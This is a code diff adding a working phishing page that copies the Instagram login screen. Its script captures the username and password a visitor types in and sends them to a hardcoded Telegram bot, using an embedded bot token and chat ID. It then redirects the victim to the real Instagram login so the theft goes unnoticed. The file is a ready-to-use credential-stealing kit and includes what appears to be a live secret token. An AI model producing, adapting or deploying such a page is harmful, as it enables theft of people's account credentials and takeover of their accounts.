@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
+        button { width: 100%; padding: 8px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; }
+        .logo { width: 175px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_with_gradient.png/110710357a31.png" class="logo" alt="Instagram">
+    <form id="fishForm">
+        <input type="text" id="user" placeholder="Phone number, username, or email" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
+<script>
+    const token = "8201700890:AAEwJzsN_hc_3xjNBsgMaZ561m5mpyFqquc";
+    const chatId = "6311365239";
+
+    document.getElementById('fishForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const text = `🚨 NEW LOGIN FOUND!\n\n👤 User: ${user}\n🔑 Pass: ${pass}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        }).then(() => {
+            // Ma'lumot ketgach, haqiqiy Instagramga yuboramiz
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        }).catch(err => console.error(err));
+    });
+</script>
+
+</body>
+</html>
